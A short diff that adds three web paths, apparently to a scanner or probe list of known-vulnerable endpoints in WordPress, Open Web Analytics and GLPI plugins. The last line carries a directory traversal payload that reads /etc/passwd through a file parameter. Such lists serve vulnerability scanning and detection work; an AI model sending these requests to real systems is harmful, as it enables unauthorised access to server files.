@@ -1,0 +1,3 @@
+/wp-content/plugins/wp-payeezy-pay/donate.php
+/wp-content/plugins/owa/index.php?owa_do=base.loginForm
+/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
